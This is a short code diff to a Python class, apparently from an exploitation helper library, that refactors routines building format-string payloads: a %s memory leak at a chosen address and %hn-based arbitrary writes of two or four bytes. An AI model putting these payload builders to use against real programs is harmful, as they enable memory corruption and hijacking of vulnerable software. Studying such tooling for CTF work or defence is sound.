@@ -855,16 +855,22 @@ class FormatStr:
         return s.split('.').index('41414141')
 
     def gets(self, addr):
-        buf = struct.pack('<I', addr)
+        buf = p32(addr)
         buf += "%%%d$s" % self.offset
         return buf
 
-    def write4(self, addr, value):
-        buf = struct.pack('<II', addr, addr+2)
+    def write2(self, addr, value):
+        buf = p32(addr)
+        n = ((value-len(buf)-1) & 0xFFFF) + 1
+        buf += "%%%dc%%%d$hn" % (n, self.offset)
+        return buf
 
-        n = [(value & 0xFFFF), ((value>>16) & 0xFFFF)]
-        n[1] = ((n[1]-n[0]-1) % 0x10000) + 1
-        n[0] = ((n[0]-len(buf)-1) % 0x10000) + 1
+    def write4(self, addr, value):
+        buf = p32([addr, addr+2])
+
+        n = [value, (value>>16)]
+        n[1] = ((n[1]-n[0]-1) & 0xFFFF) + 1
+        n[0] = ((n[0]-len(buf)-1) & 0xFFFF) + 1
 
         buf += "%%%dc%%%d$hn" % (n[0], self.offset)
         buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)
